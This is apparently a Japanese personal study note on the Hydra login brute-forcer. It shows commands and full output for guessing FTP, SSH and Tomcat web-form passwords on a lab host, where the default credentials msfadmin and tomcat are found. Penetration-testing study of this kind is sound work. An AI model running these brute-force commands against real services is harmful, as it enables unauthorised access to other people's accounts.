# hydra

## FTP

```
# hydra -L usernames.txt -P passlist.txt -t 8 172.17.220.5 ftp
```

-L: ユーザー名リスト

-P: パスワードリスト

-t: 並列実行(FTPだと16くらいまでいけるらしい、SSHは4以上で警告がでる)

```
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-14 01:07:59
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 8 tasks per 1 server, overall 8 tasks, 113718350424 login tries (l:86772/p:1310542), ~14214793803 tries per task
[DATA] attacking ftp://172.17.220.5:21/
[21][ftp] host: 172.17.220.5   login: msfadmin   password: msfadmin
[STATUS] 1310679.00 tries/min, 1310679 tries in 00:01h, 113717039745 to do in 1446:02h, 8 active
```

## SSH

ポート番号がデフォルトと異なる場合は `procotol://hostname:port` とする

```
hydra -L usernames.txt -P passlist.txt -t 4 ssh://172.17.220.5:22222
```

```
root@sec-linux:~/wordlist# hydra -L usernames.txt -P passlist.txt -t 4 172.17.220.5 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-14 01:10:29
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 113718350424 login tries (l:86772/p:1310542), ~28429587606 tries per task
[DATA] attacking ssh://172.17.220.5:22/
[22][ssh] host: 172.17.220.5   login: msfadmin   password: msfadmin
```

## http-form-post

httpのフォームで認証するサイトの場合、POST先URL,formにセットする変数と認証不可時に返却される文字列がわかればhydraが使える

あらかじめWiresharkとかでPOST先のURLと変数、認証不可時に返却される文字列を調べておく

```
# hydra -L testUsername.txt -P testPassword.txt \
  -s 8180 172.17.220.5 http-form-post \
  "/admin/j_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password"
```

-L: ユーザー名リスト

-P: パスワードリスト

-s: ポート

ホストネームとサービスは位置引数で指定する。 フォーム認証の場合、`http-form-post`

"POST先のURL:Formの変数(key=value&key=valueの形式で指定. hydraのuser, passwordはそれぞれ^USER^ ^PASS^で指定できる):認証不可時の文字列(1行完全一致)"

```
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-16 13:04:37
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking http-post-form://172.17.220.5:8180/admin/j_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password
[8180][http-post-form] host: 172.17.220.5   login: tomcat   password: tomcat
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-16 13:04:38

```